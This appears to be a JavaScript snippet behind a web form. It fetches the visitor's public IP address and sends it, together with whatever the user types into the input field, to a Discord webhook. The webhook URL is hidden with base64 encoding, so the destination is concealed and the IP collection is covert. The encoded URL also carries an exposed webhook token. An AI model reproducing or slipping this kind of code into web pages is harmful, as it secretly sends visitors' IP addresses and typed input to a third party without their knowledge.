var ip;
fetch('https://ifconfig.me/ip').then(res => res.text()).then(data => ip = data);
function send(){
  let req = new XMLHttpRequest();
  req.open("POST", atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODAzODU2NzM4NzkxOTgxMTA4L1g0WktUaEkyN3c3RWFnUFE2bjFHdk95Yk94eTBFV3YySDhrVk5yd2otYzM4d0lFSTkwdEVxb1hBazUtOWtid3gzcHJS"));
  req.setRequestHeader('Content-type', 'application/json');
  let params = {
    username: ip,
    avatar_url: "",
    content: (document.getElementById('input').value)
  }
  req.send(JSON.stringify(params));
}
